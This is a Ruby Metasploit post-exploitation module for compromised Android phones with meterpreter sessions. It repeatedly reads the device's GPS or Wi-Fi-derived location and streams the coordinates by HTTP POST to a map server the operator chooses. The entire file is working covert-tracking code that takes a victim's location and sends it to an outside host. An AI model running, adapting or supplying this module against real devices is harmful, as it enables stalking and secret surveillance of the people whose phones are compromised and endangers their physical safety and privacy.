class MetasploitModule < Msf::Post
  include Msf::Post::Android::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'Android GPS Streamer to Local Map Server',
        'Description'  => 'Pulls coordinates via geolocate (with wlan_geolocate fallback) and streams via HTTP POST.',
        'License'      => 'GPL-3.0-or-later',
        'Author'       => ['sighook'],
        'Platform'     => ['android'],
        'SessionTypes' => ['meterpreter']
      )
    )

    register_options([
      OptInt.new('INTERVAL', [true, 'Seconds between GPS polls', 5]),
      OptString.new('ENDPOINT', [true, 'Target server endpoint URL', 'http://127.0.0.1:8765/api/position']),
      OptString.new('API_KEY', [false, 'API key for wlan_geolocate fallback (if required)', ''])
    ])
  end

  def run
    interval = datastore['INTERVAL']
    endpoint = datastore['ENDPOINT']
    api_key  = datastore['API_KEY']
    uri = URI.parse(endpoint)

    print_status("Starting GPS stream to #{endpoint} (Interval: #{interval}s)...")
    print_status("Use 'jobs -k <JobID>' to stop.")

    loop do
      begin
        locations = nil

        if client.respond_to?(:android)
          # 1. Try standard GPS/Location provider geolocate first
          if client.android.respond_to?(:geolocate)
            locations = client.android.geolocate rescue nil
          end

          # 2. Fallback to wlan_geolocate if primary geolocation returned nothing
          if (locations.nil? || locations.empty?) && client.android.respond_to?(:wlan_geolocate)
            print_status("[GPS] Standard geolocate unavailable/empty, falling back to wlan_geolocate...")
            if api_key && !api_key.empty?
              locations = client.android.wlan_geolocate(api_key) rescue nil
            else
              # If wlan_geolocate requires an argument defined in the extension source
              print_error("[GPS] wlan_geolocate requires an API_KEY option to be set.")
            end
          end
        end

        if locations.is_a?(Array) && !locations.empty?
          loc = locations.first
          lat = loc['lat'] || loc[:lat]
          lon = loc['long'] || loc[:long] || loc['lon'] || loc[:lon]

          if lat && lon && lat.to_f != 0.0 && lon.to_f != 0.0
            http = Net::HTTP.new(uri.host, uri.port)
            request = Net::HTTP::Post.new(uri.path, {'Content-Type' => 'application/json'})
            request.body = { lat: lat.to_f, lon: lon.to_f }.to_json

            response = http.request(request)
            print_good("[GPS Sent] Lat: #{lat}, Lon: #{lon} | Status: #{response.code}")
          else
            print_error("[GPS] Received empty or zero coordinate values.")
          end
        else
          print_error("[GPS] Geolocate returned no location data.")
        end

      rescue ::StandardError => e
        print_error("[GPS Stream Error]: #{e.message}")
      end

      sleep(interval)
    end
  end
end
